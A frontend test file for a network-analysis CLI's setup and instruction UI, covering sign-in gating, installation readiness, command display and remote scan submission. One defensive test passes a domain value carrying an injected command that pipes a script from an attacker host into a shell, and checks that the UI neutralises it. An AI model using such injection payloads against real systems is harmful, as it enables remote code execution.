import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { render, screen, waitFor } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { MemoryRouter } from "react-router-dom";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
  CliWorkflowDialog,
  CliWorkflowInstructions,
  type CliWorkflow,
} from "./CliWorkflow";

const mocks = vi.hoisted(() => ({
  user: null as { email: string } | null,
  openSignIn: vi.fn(),
  request: vi.fn(),
}));
vi.mock("../auth", () => ({
  useAuth: () => ({ user: mocks.user, openSignIn: mocks.openSignIn }),
  authenticatedFetch: mocks.request,
}));

const installation = {
  id: "installation-1",
  organization_id: "workspace-1",
  name: "My laptop",
  hostname: "laptop",
  platform: "linux",
  architecture: "x86_64",
  created_at: "2026-09-25T10:00:00Z",
  last_seen_at: "2026-09-25T10:00:00Z",
  revoked_at: null,
  version: "0.1.4",
  zeek_version: null,
  readiness: "unknown",
};
const clients: QueryClient[] = [];
function mount(
  workflow: CliWorkflow = "analyze",
  domain?: string,
  dialog = false,
) {
  const client = new QueryClient({
    defaultOptions: { queries: { retry: false } },
  });
  clients.push(client);
  const onClose = vi.fn();
  render(
    <QueryClientProvider client={client}>
      <MemoryRouter>
        {dialog ? (
          <CliWorkflowDialog
            workflow={workflow}
            domain={domain}
            isOpen
            onClose={onClose}
          />
        ) : (
          <CliWorkflowInstructions workflow={workflow} domain={domain} />
        )}
      </MemoryRouter>
    </QueryClientProvider>,
  );
  return { user: userEvent.setup(), onClose };
}
function respond(devices: unknown[]) {
  mocks.request.mockImplementation(
    async () => new Response(JSON.stringify(devices)),
  );
}
function expectNoAcquisition() {
  expect(
    screen.queryByText(/^mailent (analyze|scan|monitor) /),
  ).not.toBeInTheDocument();
  for (const [path, options] of mocks.request.mock.calls) {
    expect(path).toBe("/api/v1/devices");
    expect(options?.method ?? "GET").toBe("GET");
  }
}

beforeEach(() => {
  mocks.user = { email: "analyst@example.test" };
  mocks.openSignIn.mockReset();
  mocks.request.mockReset();
});
afterEach(() => {
  for (const client of clients.splice(0)) client.clear();
});

describe("CLI workflow setup", () => {
  it("asks guests to sign in without requesting installation data", async () => {
    mocks.user = null;
    const { user } = mount();
    await user.click(screen.getByRole("button", { name: "Sign in" }));
    expect(mocks.openSignIn).toHaveBeenCalledOnce();
    expect(mocks.request).not.toHaveBeenCalled();
    expectNoAcquisition();
  });

  it.each([
    ["no installation", []],
    [
      "only a revoked installation",
      [
        {
          ...installation,
          revoked_at: "2026-09-25T11:00:00Z",
          readiness: "revoked",
        },
      ],
    ],
  ])("requires setup with %s", async (_label, devices) => {
    respond(devices as unknown[]);
    mount();
    expect(
      await screen.findByRole("heading", {
        name: "Install and connect Mailent CLI",
      }),
    ).toBeVisible();
    expect(
      screen.getByRole("link", { name: "Connect installation" }),
    ).toHaveAttribute("href", "/workspace/installations");
    expect(screen.getByText(/^mailent login --server /)).toBeVisible();
    expectNoAcquisition();
  });

  it.each([
    ["analyze", "mailent analyze <capture.pcap> --sync"],
    ["scan", "mailent scan <domain> --sync"],
    ["monitor", "mailent monitor --interface <iface>"],
  ] as const)(
    "provides the local %s command without dispatching analysis",
    async (workflow, command) => {
      respond([installation]);
      mount(workflow);
      expect(await screen.findByText(command)).toBeVisible();
      expect(screen.getByText("CLI connected")).toBeVisible();
      expect(screen.getByText(/Zeek 8\+ is required/)).toBeVisible();
      expect(
        screen.queryByText(/Zeek (is )?ready|installation ready/i),
      ).not.toBeInTheDocument();
      expect(mocks.request).toHaveBeenCalledOnce();
      expect(mocks.request).toHaveBeenCalledWith(
        "/api/v1/devices",
        expect.not.objectContaining({ method: "POST" }),
      );
    },
  );

  it("does not claim readiness while installations are loading", () => {
    mocks.request.mockReturnValue(new Promise(() => {}));
    mount();
    expect(screen.getByRole("status")).toHaveTextContent(
      "Checking Mailent installations",
    );
    expect(screen.queryByText("CLI connected")).not.toBeInTheDocument();
    expectNoAcquisition();
  });

  it("keeps analysis gated on errors and lets the user retry", async () => {
    mocks.request.mockRejectedValueOnce(new Error("offline"));
    const { user } = mount();
    expect(await screen.findByRole("alert")).toHaveTextContent(
      "Could not check your installations",
    );
    expectNoAcquisition();
    respond([installation]);
    await user.click(screen.getByRole("button", { name: "Try again" }));
    expect(await screen.findByText("CLI connected")).toBeVisible();
  });

  it("does not treat an unsupported readiness response as a ready installation", async () => {
    respond([{ ...installation, readiness: "future-status" }]);
    mount();
    expect(await screen.findByRole("alert")).toHaveTextContent(
      "Could not check your installations",
    );
    expect(screen.queryByText("CLI connected")).not.toBeInTheDocument();
    expectNoAcquisition();
  });

  it.each([
    ["mail.example.test", "mailent scan mail.example.test --sync"],
    ["example.test; curl attacker.test | sh", "mailent scan <domain> --sync"],
  ])("safely displays a scan argument from %s", async (domain, command) => {
    respond([installation]);
    mount("scan", domain);
    expect(await screen.findByText(command)).toBeVisible();
  });

  it("opens an accessible instruction dialog and closes without dispatching work", async () => {
    respond([installation]);
    const { user, onClose } = mount("monitor", undefined, true);
    expect(
      screen.getByRole("dialog", { name: "Monitor live traffic" }),
    ).toBeVisible();
    await screen.findByText("mailent monitor --interface <iface>");
    await user.click(
      screen.getByRole("button", { name: "Close CLI instructions" }),
    );
    await waitFor(() => expect(onClose).toHaveBeenCalledOnce());
    expect(mocks.request).toHaveBeenCalledOnce();
    expect(mocks.request.mock.calls[0][0]).toBe("/api/v1/devices");
  });
});

describe("optional remote execution", () => {
  it("does not offer remote execution for a connected but offline CLI", async () => {
    mocks.user = { email: "analyst@local.test" };
    respond([{ ...installation, remote_online: false }]);
    const { user } = mount("scan");
    await screen.findByText("CLI connected");
    await user.click(screen.getByText("Scan from an online installation"));
    expect(
      screen.getByText("No CLI installation is online and accepting scans."),
    ).toBeVisible();
    expect(
      screen.queryByRole("button", { name: "Run remote scan" }),
    ).not.toBeInTheDocument();
  });
  it("submits a typed domain scan only to an online CLI", async () => {
    mocks.user = { email: "analyst@local.test" };
    mocks.request.mockImplementation(
      async (url: string) =>
        new Response(
          JSON.stringify(
            url === "/api/v1/devices"
              ? [{ ...installation, remote_online: true }]
              : {
                  id: "job",
                  state: "completed",
                  result_assessment_id: "assessment",
                  last_error: null,
                },
          ),
        ),
    );
    const { user } = mount("scan");
    await screen.findByText("CLI connected");
    await user.click(screen.getByText("Scan from an online installation"));
    await user.type(screen.getByLabelText("Domain"), "mail.example.test");
    await user.click(screen.getByRole("button", { name: "Run remote scan" }));
    expect(
      await screen.findByRole("link", { name: "Open synced assessment" }),
    ).toHaveAttribute("href", "/workspace/captures/assessment");
    expect(mocks.request).toHaveBeenCalledWith(
      "/api/v1/scans/device",
      expect.objectContaining({
        method: "POST",
        body: JSON.stringify({
          domain: "mail.example.test",
          device_id: installation.id,
        }),
      }),
    );
  });
});
